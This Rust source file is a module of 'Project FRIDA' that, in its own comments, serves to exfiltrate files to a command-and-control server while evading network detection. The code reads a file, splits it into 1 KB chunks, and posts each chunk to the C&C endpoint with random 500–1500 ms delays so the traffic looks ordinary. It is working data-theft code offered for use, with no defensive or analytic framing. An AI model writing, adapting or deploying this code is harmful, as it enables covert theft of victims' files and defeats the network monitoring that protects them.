//! Stealthy network communication module for Project FRIDA
//!
//! This module provides functionality for sending data in small, obfuscated chunks
//! to a command-and-control (C&C) server. The primary goal is to evade network
//! detection by mimicking regular traffic and breaking down large transfers into
//! less suspicious fragments.

use serde::{Serialize, Deserialize};
use std::path::Path;
use std::fs::File;
use std::io::{Read, Result};
use reqwest::Client;
use tokio::time::{sleep, Duration};
use rand::{thread_rng, Rng};

const CHUNK_SIZE: usize = 1024; // 1 KB chunks

/// Represents a single chunk of a file being transferred.
#[derive(Serialize, Deserialize, Debug)]
pub struct FileChunk {
    pub file_id: String,
    pub chunk_index: u64,
    pub total_chunks: u64,
    pub data: Vec<u8>,
}

/// Reads a file and splits it into chunks.
///
/// # Arguments
/// * `file_path` - The path to the file to be chunked.
/// * `file_id` - A unique identifier for this file transfer.
///
/// # Returns
/// A `Result` containing a vector of `FileChunk`s or an `std::io::Error`.
pub fn chunk_file(file_path: &Path, file_id: &str) -> Result<Vec<FileChunk>> {
    let mut file = File::open(file_path)?;
    let file_size = file.metadata()?.len();
    let total_chunks = (file_size as f64 / CHUNK_SIZE as f64).ceil() as u64;

    let mut chunks = Vec::new();
    for i in 0..total_chunks {
        let mut buffer = vec![0; CHUNK_SIZE];
        let bytes_read = file.read(&mut buffer)?;
        buffer.truncate(bytes_read);

        chunks.push(FileChunk {
            file_id: file_id.to_string(),
            chunk_index: i,
            total_chunks,
            data: buffer,
        });
    }

    Ok(chunks)
}

/// Sends a vector of file chunks to the specified server URL.
///
/// # Arguments
/// * `server_url` - The URL of the C&C server endpoint for receiving chunks.
/// * `chunks` - A vector of `FileChunk`s to be sent.
///
/// # Returns
/// A `Result` indicating success or a `reqwest::Error` on failure.
pub async fn send_chunks(server_url: &str, chunks: Vec<FileChunk>) -> std::result::Result<(), reqwest::Error> {
    let client = Client::new();
    let mut rng = thread_rng();

    for chunk in chunks {
        client.post(server_url)
            .json(&chunk)
            .send()
            .await?;

        // Add a random delay to make traffic less predictable
        let delay_ms = rng.gen_range(500..1500);
        sleep(Duration::from_millis(delay_ms)).await;
    }

    Ok(())
}

// TODO: Implement server-side logic for reassembling chunks.
